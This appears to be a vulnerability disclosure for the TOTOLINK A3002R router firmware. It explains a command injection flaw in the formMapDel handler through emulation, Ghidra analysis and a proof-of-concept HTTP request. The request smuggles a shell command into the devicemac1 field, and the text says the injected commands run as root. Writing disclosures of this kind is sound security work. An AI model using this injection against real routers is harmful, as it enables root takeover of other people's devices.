## Description

A remote code execution vulnerability was discovered in the TOTOLINK A3002R firmware version V4.0.0-B20230531.1404. The vulnerability exists in the `FUN_00459fdc` function, which improperly sanitizes user input before passing it to a `system()` call. This allows an attacker to inject arbitrary commands that will be executed with root privileges on the device.

## Affected Product

- ​**Brand**: TOTOLINK
- ​**Product**: A3002R
- ​**Version**: V4.0.0-B20230531.1404

The firmware can be downloaded from this [website]([https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/258/ids/36.html)) and using FirmAE to simulate the router environment.   The command is

```shell
sudo ./run.sh -d TOTOLINK ../FIRMWARE/TOTOLINK_A3002R_Ge_V4_0_0_B20230531_1404.web
```

The default username is 'admin', password is 'admin'.
The result of the simulation is as follows: 

![[sim_res.png]](./img/sim_res.png)
## Vulnerability Analysis

The vulnerable code constructs a command string using unsanitized user input (`devicemac%d` parameter) and passes it directly to the `system()` function. Using ghidra we can find the code below in function `FUN_00459fdc`:

![[work_record/TOTOLINK/2/img/code_1.png]](./img/code_1.png)

sink point:
![[sink.png]](./img/sink.png)

The lack of input validation allows command injection through the `devicemac%d` parameter. An attacker can break out of the intended command structure and execute arbitrary commands by including shell metacharacters.

Furthermore, through analysis of the function `FUN_0040f2b4` using Ghidra, we determined that the function's purpose is to obtain the value of the parameter with the specified name in the POST.

The details of the function as follows:

* **Address**: 00459fdc
* **Function**: FUN_00459fdc
* **Parameter**: devicemac%d

## Proof of Concept (PoC)

Through ghidra we can find that this function is triggered by action 'formMapDel', so we use burpsuite to capture a normal POST packet to obtain the sessionCheck parameter for authentication and modify the packet.
Here we set the parameter `deviceNum`=2 and `enabled1`=ON to ensure the vulnerable code being excuted.
The following HTTP request demonstrates command injection that creates a file in the root directory:

```http
POST /boafrm/formMapDel HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 101
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/wlsecurity.htm?t=1744618117722

sessionCheck=a6bdaa17dd6b63a74eb809d6fa1fc2f1&deviceNum=2&enabled1=ON&devicemac1=;echo "poc">/poc.txt
```

The result of the POC is as follows. You can execute any command you want, here we create a poc.txt file with the content "poc" in the root directory.

![[burp.png]](./img/burp.png)

In the FirmAE terminal, we check whether the command is executed successfully. We can see that the command is executed successfully and the poc is written into the poc.txt file.

![[res.png]](./img/res.png)
